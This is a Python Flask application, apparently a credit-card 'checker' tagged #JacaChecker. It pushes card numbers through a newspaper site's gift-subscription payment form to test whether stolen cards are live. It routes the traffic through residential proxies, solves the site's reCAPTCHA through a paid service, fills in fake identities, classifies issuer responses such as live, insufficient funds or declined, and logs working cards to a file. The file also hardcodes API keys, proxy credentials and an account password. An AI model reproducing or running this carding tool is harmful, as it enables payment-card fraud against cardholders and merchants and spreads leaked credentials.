import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()

    
app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]

def criarTask():
    data = {
        "clientKey": "5e8c9e3e72aa7154ea2682f577243fbd",
        "task": {
            "type": "RecaptchaV2TaskProxyless",
            "websiteURL": "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp",
            "websiteKey": "6LeF47cUAAAAAMbDh0XxUukTdBNNF8xjOvWJ5Xtc",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "5e8c9e3e72aa7154ea2682f577243fbd", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
        print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        time.sleep(1)


def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)



def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    

    
    
    
def checker(card, month, year, cvv):
    
    try:    
        start_time = time.time()  
        url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
        headers = {
                'Host': 'randomuser.me',
                'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://namso-gen.com',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://namso-gen.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }

        response = requests.get( url, headers=headers, verify=False)
        email = pegarItem(response.text, '"email":"','"')
        nome = pegarItem(response.text, '"first":"','"')
        sobrenome = pegarItem(response.text, '"last":"','"')
        street = pegarItem(response.text, '"name":"','"},"city"')
        snumber = pegarItem(response.text, '"street":{"number":',',')
        city = pegarItem(response.text, '"city":"','"')
        state = pegarItem(response.text, '"state":"','"')
        state = state[0:2]
        postcode = pegarItem(response.text, '"postcode":',',')
        company = pegarItem(response.text, '"username":"','"')
        tel = random.randint(1111,9999)
        tel2 = random.randint(111,999)
        tel3 = random.randint(111,999)
        time.sleep(2)
        
        if response.status_code == 200:
            time.sleep(5)
            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
            start_time = time.time() 


            url = "https://everettweb.newzware.com/newzlib/jsp/ci/login_check_jso.jsp"

            payload = "&site=sound&login_id=jacaccbot%40gmail.com&password=radask10&referrer=&masterL=&masterP=null"
            headers = {
                'Host': 'everettweb.newzware.com',
                'Cookie': 'nwssmcookie=ssm; nwssmapptype=S',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://everettweb.newzware.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
                'accept-language': 'pt-PT,pt;q=0.9'
                }

            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
            sessao = response.headers.get('JSESSIONID')


            url = "https://everettweb.newzware.com/ss70v2/common/login.jsp"

            payload = "login_id=jacaccbot%40gmail.com&hash=c59dbf4b7a1fef9a88f2c98d9d805cab&site=sound&encrypted=Y&nwmodule=&nwpage=&rate_id=&remember=N&reverse_remember_me=N&nwregistered="
            headers = {
            'Host': 'everettweb.newzware.com',
            'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'upgrade-insecure-requests': '1',
            'origin': 'https://everettweb.newzware.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
            'accept-language': 'pt-PT,pt;q=0.9'
            }

            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
            sessao = response.headers.get('JSESSIONID')

            recap = criarTask()

            url = f"https://everettweb.newzware.com/newzlib/jsp/ci/gift.jsp?site=sound&giftAccount=90411139&login_id=jacaccbot%40gmail.com&prefix=&fname=Clarkson&b_fname=Clarkson&lname=Pesres&b_lname=Pesres&suffix=&email=jacaccbot%40gmail.com&b_email=jacaccbot%40gmail.com&copies=1&h_phone=661-345-2222&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&sameBilling=N&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_month={month}&cc_exp_year={year}&cc_holder=jame%20saks&acct_num=&acct_type=C&acct_receiving=&debit_day=10&retail_rate=7664&start_date=04/24/2024&recurring=N&tax_amt=0.00&net_amt=5.95&nie_amt=0&grat_amt=0&subtotal_amt=5.95&ju_id=0&noChargeOnGift=N&promo_code=&nwCapChallenge={recap}"

            payload = f"https://everettweb.newzware.com/newzlib/jsp/ci/gift.jsp?site=sound&giftAccount=90411139&login_id=jacaccbot%40gmail.com&prefix=&fname=Clarkson&b_fname=Clarkson&lname=Pesres&b_lname=Pesres&suffix=&email=jacaccbot%40gmail.com&b_email=jacaccbot%40gmail.com&copies=1&h_phone=661-345-2222&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&sameBilling=N&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_month={month}&cc_exp_year={year}&cc_holder=jame%20saks&acct_num=&acct_type=C&acct_receiving=&debit_day=10&retail_rate=7664&start_date=04/24/2024&recurring=N&tax_amt=0.00&net_amt=5.95&nie_amt=0&grat_amt=0&subtotal_amt=5.95&ju_id=0&noChargeOnGift=N&promo_code=&nwCapChallenge={recap}"
            headers = {
            'Host': 'everettweb.newzware.com',
            'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'accept': '*/*',
            'origin': 'https://everettweb.newzware.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp?site=sound&nwmodule=subscribers&nwpage=gift&giftAccount=90411139&login_id=jacaccbot%40gmail.com&lname=PESRES',
            'accept-language': 'pt-PT,pt;q=0.9',
            'Content-Type': 'text/plain'
            }

            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
            time.sleep(4)
                
                    
                    

            elapsed_time = time.time() - start_time
            
            MSegundos = round(elapsed_time, 2)
            
            if 'adress' in response.text:
                bin = api_bin(card[:6])              
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS [{MSegundos}] MS"                          
                open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} avs  [{MSegundos}] #JacaChecker\n")
                print(Fore.GREEN + f"{x} #JacaChecker")     
                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
            
            elif 'Insufficient funds' in response.text:
                bin = api_bin(card[:6])              
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [{MSegundos}] MS"                          
                open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
                print(Fore.GREEN + f"{x} #JacaChecker") 
                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                
            elif 'Unidentifiable error issuer generated' in response.text:
                bin = api_bin(card[:6])              
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [{MSegundos}] MS"                          
                open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                print(Fore.GREEN + f"{x} #JacaChecker") 
                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                    
            elif 'expired' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card Expired [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
                                        
            elif 'The specified account was not found' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Not Found [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"} 
                
            elif 'The account number failed to pass the LUHN' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Invalid Card [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                
            elif 'Do not honor' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Do Not Honor [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                
            elif 'Issuer has flagged this account as fraudulent' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Suspected Fraud [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                
            elif 'Card has been restricted' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card has been restricted [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                
            else:
                
                print(Fore.RED + 'Gateway Timeout' + response.text)
                return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
                

            
    except requests.exceptions.ProxyError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
        
    except requests.exceptions.ConnectionError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
    except requests.exceptions.RequestException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
    except RequisicaoException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
            


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = checker(card,mes,ano,cvv)
        return {"code": "", "retorno": "Exception"}
    
    

            
            
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    

